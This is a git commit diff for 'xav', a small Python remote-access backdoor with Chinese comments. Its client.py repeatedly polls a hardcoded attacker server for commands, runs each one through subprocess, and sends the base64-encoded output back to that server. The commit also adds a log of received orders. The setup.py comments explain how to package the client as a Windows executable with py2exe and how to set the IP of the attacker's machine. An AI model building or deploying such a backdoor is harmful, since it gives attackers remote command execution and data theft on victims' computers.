c28f714638384bf631354b1b6843c57362ebed15
3xp10it <quanyechavshuo@gmail.com>
2018-09-11 05:24:23 -0400

    up

--- xav/client.py
+++ xav/client.py
@@ -1,15 +1,14 @@
-import requests
 import time
 import socket
 import subprocess
-
+import requests
+import os
 
 def get_string_from_command(command):
     # 不能执行which nihao,这样不会有输出,可nihao得到输出
     # 执行成功的命令有正常输出,执行不成功的命令得不到输出,得到输出为””,eg.command=which nihao
     # 判断程序有没有已经安装可eg.get_string_from_command(“sqlmap —help”)
     return subprocess.getstatusoutput(command)[1]
-
 
 def base64encodeStr(string):
     # 得到base64的字符串
@@ -22,9 +21,9 @@ def base64encodeStr(string):
     return base64Str
 
 
-self_hostname = socket.getfqdn(socket.gethostname())
-self_ip = socket.gethostbyname(self_hostname)
-server_address = 'http://192.168.110.135:8080/'
+addrs = socket.getaddrinfo(socket.gethostname(),None)
+self_ip=[item[4][0] for item in addrs if ':' not in item[4][0]][0]
+server_address = 'http://192.168.40.129:8080/'
 
 while True:
     time.sleep(1)
@@ -36,9 +35,12 @@ while True:
             while True:
                 order = requests.get(
                     server_address + "?ip=%s&action=askfororder" % self_ip).content.decode("utf8")
+                with open("c:\\order.txt","a+") as f:
+                    f.write(order+"\n")
                 if order == "bye":
                     break
-                result = base64encodeStr(get_string_from_command(order))
+                command_result=get_string_from_command(order)
+                result = base64encodeStr(command_result)
                 requests.get(
                     server_address + "?ip=%s&action=returnresult&result=%s" % (self_ip, result))
     except:
--- xav/setup.py
+++ xav/setup.py
@@ -1,5 +1,14 @@
 # 运行方法
 # c:\python34\python setup.py py2exe
+# 如果报错则需安装https://blog.csdn.net/justheretobe/article/details/50573617这里说的pyreadline(pip install pyreadline)
+# 也即所有步骤如下：
+# 1.安装python34到c:\python34
+# 2.c:\Python34\Scripts\pip install py2exe
+# 3.c:\Python34\Scripts\pip install pyreadline
+# 4.c:\Python34\Scripts\pip install requests(client.py需要requests
+# 5.修改client.py中的攻击者使用的机器的ip地址，也即运行server.py的机器的ip
+# 6.c:\python34\python setup.py py2exe
+
 from distutils.core import setup
 import py2exe
 
